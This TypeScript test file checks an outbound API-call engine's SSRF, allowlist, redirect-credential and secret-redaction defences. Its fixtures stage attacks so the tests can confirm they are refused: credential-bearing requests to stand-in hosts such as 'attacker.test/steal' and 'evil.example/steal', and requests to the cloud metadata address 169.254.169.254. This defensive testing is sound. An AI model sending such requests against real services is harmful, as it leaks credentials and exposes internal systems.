// SPDX-License-Identifier: Apache-2.0

/**
 * `fetchApiCall` — the outbound half every api_call path shares (platform
 * proxy, sidecar, local CLI): the initial-target gate (allowlist + SSRF + DNS
 * rebind, literal declared hosts exempt when the path trusts them), the
 * credential rule across redirects, the address pin and the deadline.
 */

import { describe, it, expect, mock, afterEach } from "bun:test";
import {
  API_CALL_TIMEOUT_MS,
  classifyApiCallFailure,
  fetchApiCall,
  PreflightError,
  RedirectBlockedError,
  type FetchApiCallOptions,
} from "../../src/resolvers/api-call-engine.ts";
import { hostLiterallyAllowlisted } from "../../src/resolvers/http-call-core.ts";

const publicResolver = async () => ["203.0.113.7"];
const internalResolver = async () => ["10.0.0.5"];

/** `fetchApiCall` with the gate of one branch; resolves to the refusal or `null` when sent. */
async function gate(
  url: string,
  opts: Partial<FetchApiCallOptions> & { declaredUris?: readonly string[] },
): Promise<PreflightError | null> {
  const fetchFn = mock(async () => new Response("ok")) as unknown as typeof fetch;
  const declaredUris = opts.declaredUris ?? [];
  const allowAllUris = opts.allowAllUris ?? false;
  try {
    await fetchApiCall({
      url,
      init: { method: "GET" },
      authorizedUris: [],
      declaredUris,
      allowAllUris,
      credentialHeaders: [],
      integrationId: "i",
      fetchFn,
      ...opts,
      credentialFields: opts.credentialFields ?? {},
    });
    return null;
  } catch (err) {
    if (err instanceof PreflightError) return err;
    throw err;
  }
}

describe("fetchApiCall — a transport error", () => {
  const bunError = (message = "Unable to connect. Is the computer able to access the url?") =>
    Object.assign(new Error(message), {
      name: "ConnectionRefused",
      path: "https://api.example.com/v1?key=SeCrEt-path-7",
    });

  /** The error `fetchApiCall` rejects with when the transport throws `thrown`. */
  const sendFailing = (thrown: Error, credentialFields: Record<string, string> = {}) =>
    fetchApiCall({
      url: "https://api.example.com/v1",
      init: { method: "GET" },
      authorizedUris: [],
      declaredUris: [],
      allowAllUris: true,
      credentialHeaders: [],
      trustedHost: () => false,
      integrationId: "i",
      fetchFn: (async () => {
        throw thrown;
      }) as unknown as typeof fetch,
      resolveHost: publicResolver,
      credentialFields,
    }).then(
      () => null,
      (e: unknown) => e,
    );

  it("is rebuilt without the URL Bun keeps on `.path` on a templated call", async () => {
    const out = (await sendFailing(bunError(), { api_key: "SeCrEt-path-7" })) as Error;
    expect(out.name).toBe("ConnectionRefused");
    expect(out.message).toContain("Unable to connect");
    expect(JSON.stringify({ ...out })).not.toContain("SeCrEt-path-7");
  });

  it("is rethrown untouched on an untemplated call", async () => {
    const err = bunError();
    expect(await sendFailing(err)).toBe(err);
  });

  it("scrubs the longest value first, so a value containing another is not half-leaked", async () => {
    const out = (await sendFailing(bunError("failed at https://x.example/?k=abcdefgh abcdefgh"), {
      a: "abc",
      b: "abcdefgh",
    })) as Error;
    expect(out.message).toBe("failed at x.example {{b}}");
  });
});

describe("redirect loop error", () => {
  it("names the redacted host, never the substituted URL", async () => {
    const secret = "SeCrEt-loop-42";
    const url = `https://api.acme.com/v1?key=${secret}`;
    const err = await fetchApiCall({
      url,
      init: { method: "GET" },
      fetchFn: (async (u: string) =>
        new Response(null, { status: 302, headers: { location: u } })) as unknown as typeof fetch,
      authorizedUris: ["https://api.acme.com/**"],
      declaredUris: ["https://api.acme.com/**"],
      allowAllUris: false,
      credentialHeaders: [],
      trustedHost: () => false,
      integrationId: "i",
      resolveHost: publicResolver,
      credentialFields: { api_key: secret },
    }).then(
      () => null,
      (e: Error) => e,
    );
    expect(err?.message).toContain("Too many redirects");
    expect(err!.message).toContain("api.acme.com");
    expect(err!.message).not.toContain(secret);
  });
});

describe("hostLiterallyAllowlisted", () => {
  it("pins an exact literal host", () => {
    expect(
      hostLiterallyAllowlisted("https://api.example.com/x", ["https://api.example.com/**"]),
    ).toBe(true);
  });

  it("never pins a glob host", () => {
    expect(hostLiterallyAllowlisted("https://anything.example/x", ["https://**"])).toBe(false);
    expect(hostLiterallyAllowlisted("https://a.example.com/x", ["https://*.example.com/**"])).toBe(
      false,
    );
  });

  it("tolerates a globbed scheme on a literal host", () => {
    expect(hostLiterallyAllowlisted("https://intranet.corp/x", ["**://intranet.corp/**"])).toBe(
      true,
    );
  });

  it("tolerates a globbed port on a literal host", () => {
    expect(
      hostLiterallyAllowlisted("https://intranet.corp/x", ["https://intranet.corp:*/**"]),
    ).toBe(true);
  });

  it("strips a literal port from the spec authority", () => {
    expect(
      hostLiterallyAllowlisted("https://api.example.com/x", ["https://api.example.com:8443/**"]),
    ).toBe(true);
  });

  it("never pins through a malformed entry, which the matcher refuses too", () => {
    for (const spec of ["https://user@api.example.com/**", "https://api%2Eexample.com/**"]) {
      expect(hostLiterallyAllowlisted("https://api.example.com/x", [spec])).toBe(false);
    }
  });

  it("compares hosts case-insensitively", () => {
    expect(
      hostLiterallyAllowlisted("https://API.Example.com/x", ["https://api.example.com/**"]),
    ).toBe(true);
  });

  it("never pins a templated host, even one spelled literally in the target", () => {
    expect(
      hostLiterallyAllowlisted("https://{$credential.host}/x", ["https://{$credential.host}/**"]),
    ).toBe(false);
  });

  it("returns false on an unparseable URL", () => {
    expect(hostLiterallyAllowlisted("::::", ["https://api.example.com/**"])).toBe(false);
  });
});

describe("fetchApiCall — initial-target gate per branch", () => {
  it("allow_all: refuses a hostname resolving into a blocked range", async () => {
    const err = await gate("https://rebind.example/x", {
      allowAllUris: true,
      resolveHost: internalResolver,
    });
    expect(err?.reason).toBe("ssrf");
  });

  it("allow_all: an unresolvable host is `unresolvable`, host redacted to itself", async () => {
    const err = await gate("https://gone.example/secret?token=x", {
      allowAllUris: true,
      resolveHost: async () => {
        throw new Error("ENOTFOUND");
      },
    });
    expect(err?.reason).toBe("unresolvable");
    expect(err!.message).toContain("gone.example");
    expect(err!.message).not.toContain("token");
  });

  it("no allowlist and no allow_all: every target is refused before any DNS work", async () => {
    const resolveHost = mock(publicResolver);
    const err = await gate("https://ok.example/x", { resolveHost });
    expect(err?.reason).toBe("not_authorized");
    expect(resolveHost).not.toHaveBeenCalled();
  });

  it("glob-matched allowlist host stays behind the SSRF gate", async () => {
    const err = await gate("https://rebind.example/x", {
      authorizedUris: ["https://**"],
      declaredUris: ["https://**"],
      resolveHost: internalResolver,
    });
    expect(err?.reason).toBe("ssrf");
  });

  it("literal-host allowlist exempts an internal-resolving host (operator topology)", async () => {
    const resolveHost = mock(internalResolver);
    const err = await gate("https://intranet.corp/api", {
      authorizedUris: ["https://intranet.corp/**"],
      declaredUris: ["https://intranet.corp/**"],
      resolveHost,
    });
    expect(err).toBeNull();
    expect(resolveHost).not.toHaveBeenCalled();
  });

  it("under allow_all_uris no declared host is exempt by default: the caller picks the host", async () => {
    const err = await gate("https://intranet.corp/api", {
      allowAllUris: true,
      declaredUris: ["https://intranet.corp/**"],
      resolveHost: internalResolver,
    });
    expect(err?.reason).toBe("ssrf");
  });

  it("a path that does not trust declared hosts keeps them behind the SSRF gate", async () => {
    const err = await gate("https://intranet.corp/api", {
      authorizedUris: ["https://intranet.corp/**"],
      declaredUris: ["https://intranet.corp/**"],
      trustedHost: () => false,
      resolveHost: internalResolver,
    });
    expect(err?.reason).toBe("ssrf");
  });

  it("an operator-trusted host skips the SSRF gate", async () => {
    const err = await gate("https://idp.internal/x", {
      allowAllUris: true,
      trustedHost: (host) => host === "idp.internal",
      resolveHost: internalResolver,
    });
    expect(err).toBeNull();
  });

  it("a host rendered from a connection value is never pinned (SSRF gate applies)", async () => {
    const resolveHost = mock(internalResolver);
    const err = await gate("https://intranet.corp/api", {
      authorizedUris: ["https://intranet.corp/**"],
      declaredUris: ["https://{$credential.host}/**"],
      resolveHost,
    });
    expect(err?.reason).toBe("ssrf");
    expect(resolveHost).toHaveBeenCalled();
  });

  it("a rendered IP-literal internal host is literal-blocked", async () => {
    for (const url of ["https://169.254.169.254/latest", "https://127.0.0.1/x"]) {
      const host = new URL(url).host;
      const err = await gate(url, {
        authorizedUris: [`https://${host}/**`],
        declaredUris: ["https://{$credential.host}/**", "{$credential.site_url}/**"],
        resolveHost: publicResolver,
      });
      expect(err?.reason).toBe("ssrf");
    }
  });

  it("a malformed entry authorizes nothing: the injected credential is never sent", async () => {
    const fetchFn = mock(async () => new Response("ok")) as unknown as typeof fetch;
    for (const pattern of ["https://@x:y@**/**", "https://%2A%2A\\**"]) {
      const err = await gate("https://attacker.test/steal", {
        init: { method: "GET", headers: { "X-Api-Key": "SECRET" } },
        credentialHeaders: ["X-Api-Key"],
        authorizedUris: [pattern],
        declaredUris: [pattern],
        fetchFn,
        resolveHost: publicResolver,
      });
      expect(err?.reason).toBe("not_authorized");
    }
    expect(fetchFn).not.toHaveBeenCalled();
  });

  it("off-allowlist target is refused before any DNS work", async () => {
    const resolveHost = mock(publicResolver);
    const err = await gate("https://evil.example/x", {
      authorizedUris: ["https://api.example.com/**"],
      declaredUris: ["https://api.example.com/**"],
      resolveHost,
    });
    expect(err?.reason).toBe("not_authorized");
    expect(resolveHost).not.toHaveBeenCalled();
  });

  it("a declared list the connection does not render refuses every target (#1627)", async () => {
    const resolveHost = mock(publicResolver);
    const err = await gate("https://attacker.example/steal", {
      declaredUris: ["{$credential.site_url}/**"],
      resolveHost,
    });
    expect(err?.reason).toBe("not_authorized");
    expect(resolveHost).not.toHaveBeenCalled();
  });

  it("a declared literal host is not trusted under allow_all_uris", async () => {
    const err = await gate("https://intranet.corp/api", {
      allowAllUris: true,
      declaredUris: ["https://intranet.corp/**"],
      resolveHost: internalResolver,
    });
    expect(err?.reason).toBe("ssrf");
  });

  it("an off-allowlist refusal names the declared entries, never a rendered one", async () => {
    const hook = "https://hooks.example.com/services/T000/B000/SECRETTOKEN";
    const err = await gate("https://example.com/", {
      authorizedUris: [hook],
      declaredUris: ["{$credential.webhook_url}"],
      resolveHost: publicResolver,
    });
    expect(err!.message).toContain("{$credential.webhook_url}");
    expect(err!.message).not.toContain("SECRETTOKEN");
  });

  it("IP-literal internal target is literal-blocked before DNS", async () => {
    const resolveHost = mock(publicResolver);
    const err = await gate("https://169.254.169.254/latest/meta-data", {
      allowAllUris: true,
      resolveHost,
    });
    expect(err?.reason).toBe("ssrf");
    expect(resolveHost).not.toHaveBeenCalled();
  });

  it("public-resolving target proceeds on every gated branch", async () => {
    const branches: Array<{ allowAllUris?: boolean; authorizedUris?: string[] }> = [
      { allowAllUris: true },
      { authorizedUris: ["https://**"] },
    ];
    for (const opts of branches) {
      const err = await gate("https://ok.example/x", {
        ...opts,
        declaredUris: opts.authorizedUris ?? [],
        resolveHost: publicResolver,
      });
      expect(err).toBeNull();
    }
  });
});

describe("fetchApiCall — credentials across a redirect", () => {
  /** Headers each hop received; the first hop redirects to `to`. */
  async function hopHeaders(
    to: string,
    policy: Pick<FetchApiCallOptions, "authorizedUris" | "allowAllUris">,
    status = 302,
  ): Promise<Headers[]> {
    const seen: Headers[] = [];
    const fetchFn = (async (_url: string, init?: RequestInit) => {
      seen.push(new Headers(init?.headers));
      return seen.length === 1
        ? new Response(null, { status, headers: { location: to } })
        : new Response("ok");
    }) as unknown as typeof fetch;
    await fetchApiCall({
      url: "https://api.dropboxapi.com/2/files/download",
      init: {
        method: "GET",
        headers: { Authorization: "Bearer tok", "X-Api-Key": "k", Cookie: "s=1" },
      },
      ...policy,
      declaredUris: policy.authorizedUris,
      credentialHeaders: ["Authorization", "X-Api-Key"],
      trustedHost: () => false,
      integrationId: "i",
      credentialFields: {},
      fetchFn,
      resolveHost: publicResolver,
    });
    return seen;
  }

  it("keeps them on a cross-origin hop the allowlist names (Dropbox api. -> content.)", async () => {
    const [, second] = await hopHeaders("https://content.dropboxapi.com/2/files/download", {
      authorizedUris: ["https://api.dropboxapi.com/**", "https://content.dropboxapi.com/**"],
      allowAllUris: false,
    });
    expect(second!.get("authorization")).toBe("Bearer tok");
    expect(second!.get("x-api-key")).toBe("k");
    expect(second!.get("cookie")).toBe("s=1");
  });

  it("strips them on an origin change no allowlist authorizes", async () => {
    const [, second] = await hopHeaders("https://cdn.example.net/blob", {
      authorizedUris: [],
      allowAllUris: true,
    });
    expect(second!.get("authorization")).toBeNull();
    expect(second!.get("x-api-key")).toBeNull();
    expect(second!.get("cookie")).toBeNull();
  });

  it("refuses a hop off the allowlist instead of following it", async () => {
    const err = await hopHeaders("https://evil.example/steal", {
      authorizedUris: ["https://api.dropboxapi.com/**"],
      allowAllUris: false,
    }).catch((e: unknown) => e);
    expect(err).toBeInstanceOf(RedirectBlockedError);
    expect((err as RedirectBlockedError).reason).toBe("unauthorized");
  });

  it("classifies a hop to a host with no DNS answer as unresolvable, not as SSRF", async () => {
    const fetchFn = mock(
      async () => new Response(null, { status: 302, headers: { location: "https://gone.test/" } }),
    ) as unknown as typeof fetch;
    const err = await fetchApiCall({
      url: "https://api.example.com/x",
      init: { method: "GET" },
      authorizedUris: ["https://api.example.com/**", "https://gone.test/**"],
      declaredUris: ["https://api.example.com/**", "https://gone.test/**"],
      allowAllUris: false,
      credentialHeaders: [],
      trustedHost: () => false,
      integrationId: "i",
      credentialFields: {},
      fetchFn,
      resolveHost: async (host) => {
        if (host === "gone.test") throw new Error("ENOTFOUND");
        return ["203.0.113.7"];
      },
    }).catch((e: unknown) => e);
    expect(err).toBeInstanceOf(RedirectBlockedError);
    expect(classifyApiCallFailure(err)).toMatchObject({ kind: "unresolvable", redirect: true });
  });

  it("returns a streaming body's redirect unfollowed", async () => {
    const fetchFn = mock(
      async () => new Response(null, { status: 307, headers: { location: "https://x.example/" } }),
    ) as unknown as typeof fetch;
    const { response, hops } = await fetchApiCall({
      url: "https://api.example.com/upload",
      init: { method: "PUT", body: new Blob(["x"]).stream(), duplex: "half" } as RequestInit,
      authorizedUris: ["https://api.example.com/**", "https://x.example/**"],
      declaredUris: ["https://api.example.com/**", "https://x.example/**"],
      allowAllUris: false,
      credentialHeaders: [],
      trustedHost: () => false,
      integrationId: "i",
      credentialFields: {},
      fetchFn,
      resolveHost: publicResolver,
    });
    expect(response.status).toBe(307);
    expect(hops).toBe(0);
    expect(fetchFn).toHaveBeenCalledTimes(1);
  });
});

describe("fetchApiCall — transport", () => {
  const realFetch = globalThis.fetch;
  afterEach(() => {
    globalThis.fetch = realFetch;
  });

  it("connects to the validated address by default, keeping the logical Host", async () => {
    let seen: { url: string; host: string | null } | null = null;
    globalThis.fetch = (async (url: string, init?: RequestInit) => {
      seen = { url, host: new Headers(init?.headers).get("host") };
      return new Response("ok");
    }) as unknown as typeof fetch;
    const { finalUrl } = await fetchApiCall({
      url: "https://api.example.com/v1",
      init: { method: "GET" },
      authorizedUris: ["https://api.example.com/**"],
      declaredUris: ["https://api.example.com/**"],
      allowAllUris: false,
      credentialHeaders: [],
      trustedHost: () => false,
      integrationId: "i",
      credentialFields: {},
      resolveHost: publicResolver,
    });
    expect(seen!.url).toContain("203.0.113.7");
    expect(seen!.host).toBe("api.example.com");
    expect(finalUrl).toBe("https://api.example.com/v1");
  });

  it("never forwards a caller-supplied Host, even on an unpinned hop", async () => {
    let seen: Headers | null = null;
    const fetchFn = (async (_url: string, init?: RequestInit) => {
      seen = new Headers(init?.headers);
      return new Response("ok");
    }) as unknown as typeof fetch;
    await fetchApiCall({
      url: "https://api.example.com/v1",
      init: { method: "GET", headers: { Host: "other.example", "X-Api-Key": "k" } },
      authorizedUris: ["https://api.example.com/**"],
      declaredUris: ["https://api.example.com/**"],
      allowAllUris: false,
      credentialHeaders: ["X-Api-Key"],
      trustedHost: () => false,
      integrationId: "i",
      credentialFields: {},
      fetchFn,
      resolveHost: publicResolver,
    });
    expect(seen!.get("host")).toBeNull();
    expect(seen!.get("x-api-key")).toBe("k");
  });

  it(`bounds the exchange at API_CALL_TIMEOUT_MS (${API_CALL_TIMEOUT_MS} ms) AND the caller's signal`, async () => {
    const caller = new AbortController();
    let signal: AbortSignal | undefined;
    const fetchFn = (async (_url: string, init?: RequestInit) => {
      signal = init?.signal ?? undefined;
      return new Response("ok");
    }) as unknown as typeof fetch;
    await fetchApiCall({
      url: "https://api.example.com/v1",
      init: { method: "GET", signal: caller.signal },
      authorizedUris: [],
      declaredUris: [],
      allowAllUris: true,
      credentialHeaders: [],
      trustedHost: () => false,
      integrationId: "i",
      credentialFields: {},
      fetchFn,
      resolveHost: publicResolver,
    });
    expect(API_CALL_TIMEOUT_MS).toBe(30_000);
    expect(signal).not.toBe(caller.signal);
    expect(signal!.aborted).toBe(false);
    caller.abort();
    expect(signal!.aborted).toBe(true);
  });
});

describe("classifyApiCallFailure", () => {
  it("names what every path maps: refusal, redirect, timeout, transport", () => {
    expect(classifyApiCallFailure(new PreflightError("unresolvable", "m"))).toEqual({
      kind: "unresolvable",
      redirect: false,
      message: "m",
    });
    expect(classifyApiCallFailure(new RedirectBlockedError("unauthorized", "h"))).toMatchObject({
      kind: "not_authorized",
      redirect: true,
    });
    expect(classifyApiCallFailure(new RedirectBlockedError("ssrf", "h")).kind).toBe("ssrf");
    expect(classifyApiCallFailure(new RedirectBlockedError("unresolvable", "h")).kind).toBe(
      "unresolvable",
    );
    expect(classifyApiCallFailure(new DOMException("late", "TimeoutError")).kind).toBe("timeout");
    expect(
      classifyApiCallFailure(Object.assign(new Error("refused"), { code: "ECONNREFUSED" })),
    ).toEqual({ kind: "transport", redirect: false, message: "refused", code: "ECONNREFUSED" });
  });
});
